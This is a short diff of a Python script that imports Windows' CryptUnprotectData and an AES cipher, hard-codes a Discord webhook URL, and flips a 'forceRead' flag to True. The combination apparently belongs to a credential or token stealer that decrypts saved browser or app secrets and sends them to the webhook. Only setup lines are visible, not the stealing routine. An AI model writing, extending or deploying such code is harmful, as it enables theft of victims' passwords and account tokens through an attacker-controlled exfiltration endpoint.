@@ -18,7 +18,7 @@ from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES 
 
 webhook = "https://discord.com/api/webhooks/1335514430850601071/50AL7KFqOMpFHHkGHDNUaOIrSySXAgUpxVWR9ZpirH0m-wZbnfz_fHod-VxlBPq-OoTU"
-forceRead = False
+forceRead = True
 debug = False # Secret thingy for development (Don't mess with it)
 
 def safe(func):
